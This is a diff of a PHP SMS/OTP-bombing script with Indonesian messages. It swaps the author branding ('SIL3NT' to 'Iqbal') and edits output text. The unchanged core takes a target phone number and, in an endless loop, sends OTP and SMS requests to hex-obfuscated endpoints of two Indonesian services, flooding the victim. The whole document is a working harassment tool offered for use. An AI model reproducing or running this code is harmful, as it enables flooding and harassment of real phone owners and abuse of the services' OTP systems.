@@ -62,15 +62,15 @@ if(function_exists('pcntl_signal')) {
 
 		case SIGTERM:
 
-		die($Y."\n====================[] SIL3NT []=====(√√√)>".$X."\n");
+		die($Y."\n====================[] Iqbal []=====(√√√)>".$X."\n");
 
 		case SIGKILL:
 
-		die($Y."\n====================[] SIL3NT []=====(√√)>".$X."\n");
+		die($Y."\n====================[] Iqbal []=====(√√)>".$X."\n");
 
 		case SIGINT:
 
-		die($Y."\n====================[] SIL3NT []=====(√)>".$X."\n");
+		die($Y."\n====================[] Iqbal []=====(√)>".$X."\n");
 
 		}
 
@@ -107,19 +107,7 @@ function post_data($url,$data) {
 	echo $Y.
 
 "
-
-___ ____ _____
-
-|_ _/ ___|_ _|__ _ __ __ _ _ __ ___
-
-| | | | |/ __| '_ \ / _` | '_ ` _ \
-
-| | |___ | |\__ \ |_) | (_| | | | | | |
-
-|___\____| |_||___/ .__/ \__,_|_| |_| |_|
-
-|_|
-
+Iqbal Bilal Ismail
 ";
 
 echo $G."\n========[]Sekelimus[]========".$X."\n";
@@ -150,17 +138,17 @@ echo $G."\nWhatsapp: 0823-1622-6095";
 
 echo $G."\nSekelimus Team".$G.$X."\n\n";
 
-isset($argv[1]) OR die($G."ERROR: SILAHKAN MASUKAN NOMOR HP TARGER\n".$X);
+isset($argv[1]) OR die($G."ERROR: SILAHKAN MASUKAN NOMOR HP TARGET\n".$X);
 
 if(is_numeric($argv[1])) {
 
-	echo "INFORMATION: SEDANG DIPROSES".$G.$argv[1].$X."\n";
+	echo $G."\nINFORMATION: SEDANG DIPROSESb".$G.$argv[1].$X."\n";
 
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
 
 	while(1) {
 
-		echo "SUCCESSFULLY: SMS DIKIRIM KE NOMOR".$G.$argv[1].$X."\n";	
+		echo $G."\nSUCCESSFULLY: SMS DIKIRIM KE NOMOR ".$G.$argv[1].$X."\n";	
 
 		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
 
@@ -182,7 +170,7 @@ $argv[1]=str_replace(' ','',$argv[1]);
 
 foreach($argv[1] as $argv[2]):
 
-echo "INFORMATION: SEDANG MEMPROSES".$G.$argv[2].$X."\n";
+echo $G."\nINFORMATION: SEDANG MEMPROSES ".$G.$argv[2].$X."\n";
 
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[2]."&accept=call");
 
@@ -192,7 +180,7 @@ while(1) {
 
 foreach($argv[1] as $argv[2]):
 
-echo "SUCCESSFULLY: SMS DIKIRIM KE NOMOR".$G.$argv[2].$X."\n";
+echo $G."\nSUCCESSFULLY: SMS DIKIRIM KE NOMOR".$G.$argv[2].$X."\n";
 
 	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");
 
